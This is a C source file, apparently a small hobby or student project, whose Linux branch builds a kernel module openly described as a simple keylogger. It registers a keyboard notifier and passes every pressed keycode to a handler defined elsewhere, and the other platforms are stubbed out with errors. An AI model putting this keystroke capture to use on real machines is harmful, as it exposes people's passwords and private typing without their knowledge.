#include "hook.h"


// TODO: add definitions for `subscribe` and `handleMedium`
// probably platform dependent


#if defined(WIN32) || defined(_WIN32) || defined(__WIN32__) || defined(__NT__)
    //define something for Windows (32-bit and 64-bit, this part is common)
    
    #error "no Windows"
    
    #ifdef _WIN64
        //define something for Windows (64-bit only)
    #else
        //define something for Windows (32-bit only)
    #endif
#elif __APPLE__
    #error "no Apple"
    
    #include <TargetConditionals.h>
    #if TARGET_IPHONE_SIMULATOR
         // iOS Simulator
    #elif TARGET_OS_MACCATALYST
         // Mac's Catalyst (ports iOS API into Mac, like UIKit).
    #elif TARGET_OS_IPHONE
        // iOS device
    #elif TARGET_OS_MAC
        // Other kinds of Mac OS
    #else
    #   error "Unknown Apple platform"
    #endif
#elif __linux__
    // linux
    
    #include <linux/module.h>
    #include <linux/kernel.h>
    #include <linux/keyboard.h>
    #include <linux/init.h>

    #define DRIVER_AUTHOR "Bartol Hrg <bartol.hrg@fer.hr>"
    #define DRIVER_DESC "Simple keylogger that prints keycodes"

    MODULE_LICENSE("GPL");
    MODULE_AUTHOR(DRIVER_AUTHOR);
    MODULE_DESCRIPTION(DRIVER_DESC);
    
    typedef struct notifier_block notifier_block;
    typedef struct keyboard_notifier_param keyboard_notifier_param;
    
    
    static FUNCTION( myHandleMedium OF (DECLARE(nblock AS notifier_block*), DECLARE(action AS unsigned long), DECLARE(data AS keyboard_notifier_param*)) AS int );
    
    notifier_block nb = {
        .notifier_call = myHandleMedium,
    };
    
    static FUNCTION( myHandleMedium OF (
        DECLARE(nblock AS notifier_block*), 
        DECLARE(action AS unsigned long), 
        DECLARE(data AS keyboard_notifier_param*)
    ) AS int ) 
    STARTFUNCTION
        IF action == KBD_KEYCODE && data->down THEN
            Event event = {
                .value = data->value,
            };
            myHandle(&event);
        ENDIF
        
        return NOTIFY_OK;
    ENDFUNCTION
    
    static FUNCTION( __init myInit OF () AS int ) 
    STARTFUNCTION
        printk(KERN_INFO "Starting\n");
        register_keyboard_notifier(&nb);
        return 0;
    ENDFUNCTION
    
    static FUNCTION( __exit myExit OF () AS void ) 
    STARTFUNCTION
        printk(KERN_INFO "\nEnding\n");
        unregister_keyboard_notifier(&nb);
    ENDFUNCTION
    
    module_init(myInit);
    module_exit(myExit);
    
    
    
#elif __unix__ // all unices not caught above
    // Unix
    #error "no Unix"
#elif defined(_POSIX_VERSION)
    // POSIX
    #error "no POSIX"
#else
    #error "Unknown compiler"
#endif